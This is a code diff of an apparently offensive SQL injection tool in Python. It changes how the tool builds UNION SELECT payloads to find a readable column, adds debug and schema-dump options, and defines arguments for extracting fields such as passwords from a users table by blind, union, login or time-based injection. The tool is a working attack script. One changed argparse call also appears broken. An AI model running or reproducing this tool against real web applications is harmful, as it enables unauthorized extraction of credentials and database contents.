@@ -30,11 +30,7 @@ def build_payload(payload):
 def check_url(url, payload):
 
     time.sleep(CONF['delay_request'])
-
     get_data, post_data, cookies, headers = build_payload(payload)
-
-    #print(get_data, post_data, cookies, headers)
-
 
     if CONF['method'] == 'POST':
         headers['Content-Type'] = "application/x-www-form-urlencoded"
@@ -43,6 +39,9 @@ def check_url(url, payload):
         res = requests.post(url + '?' + get_data, data=post_data, cookies=cookies, headers=headers)
     else:
         res = requests.get(url + '?' + get_data, cookies=cookies, headers=headers)
+    
+    #print(get_data, post_data, cookies, headers)
+    #print(res.text)
 
     return res
 
@@ -114,18 +113,22 @@ def union_nb_columns(url, val):
 
 def union_readable_column(url, nb_columns, val):
 
-    tab_fields = [str(x) * 10 for x in range(nb_columns)]
-    fields = ','.join(tab_fields)
+    tab_readable = []
+    tab_placeholder = [str(x) * 10 for x in range(nb_columns)]
+    fields = ','.join(tab_placeholder)
 
-    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
-    check = check_result(result)
+    #result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields} FROM {CONF['table']} LIMIT 0,1-- -")
+    result = check_url(url, f"{val}{CONF['breaker']} UNION SELECT {fields}-- -")
     
-    if check:
-        for x in range(len(tab_fields)):
-            if tab_fields[x] in result.text:
-                return x
+    for x in range(len(tab_placeholder)):
+        if tab_placeholder[x] in result.text:
+            tab_readable.append(x)
+
+    if len(tab_readable) > 0:
+        return tab_readable[0]
 
     return -1
+
 
 def union_extract(url, nb_columns, val, idx_column=0, limit_start=0, limit_count=500):
     data_found = ''
@@ -208,8 +211,8 @@ parser.add_argument('-u', '--url', metavar='', required=True, help='URL to brute
 parser.add_argument('-m', '--method', metavar='', default='POST', choices=['GET','POST'], help='HTTP method to use')
 
 group1 = parser.add_argument_group('Request parameters')
-group1.add_argument('-x', '--headers', metavar='', action='append', help='Additionnal headers, format HEADER:VALUE Use ^SQLI^ as placeholder')
-group1.add_argument('-c', '--cookies', metavar='', action='append', help='Cookies. Standard format : NAME:VALUE Use ^SQLI^ as placeholder')
+group1.add_argument('-x', '--headers', metavar='', action='append', help='Additionnal headers, format HEADER=VALUE Use ^SQLI^ as placeholder')
+group1.add_argument('-c', '--cookies', metavar='', action='append', help='Cookies. Standard format : NAME=VALUE Use ^SQLI^ as placeholder')
 group1.add_argument('-p', '--post-data', metavar='', default='', help='POST body to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
 group1.add_argument('-g', '--get-data', metavar='', default='', help='GET data to send. Standard format : var1=val1&var2=val2 Use ^SQLI^ as placeholder')
 
@@ -217,11 +220,12 @@ group2 = parser.add_argument_group('SQLi options')
 group2.add_argument('-f', '--field', metavar='', default='password', help='Field(s) to extract, (password or username,password)')
 group2.add_argument('-t', '--table', metavar='', default='users', help='Table to extract from')
 group2.add_argument('-a', '--action', metavar='', default='', choices=['blind','union','login','time'], help='Type of injection to execute')
-#group2.add_argument('-d', '--dump-schema', metavar='', default=False, action='store_true', help='Edump database schema')
 group2.add_argument('-v', '--value', metavar='', default='', help='Valid value used to check if SQLi is working')
+group2.add_argument('-debug', '--debug', metavar='', default=False, action='store_true', help='')
+group2.add_argument('-d', '--dump-schema', metavar='', default=False, action='store_true', help='Dump database schema')
 
-#group = parser.add_mutually_exclusive_group(required=True)
-group3 = parser.add_argument_group('Result detection')
+#group3 = parser.add_argument_group('Result detection')
+group3 = parser.add_mutually_exclusive_group('Result detection', required=True)
 group3.add_argument('-s', '--success', metavar='', help='Success string to look for')
 group3.add_argument('-e', '--error', metavar='', help='Error string to look for')
 #args = parser.parse_args()
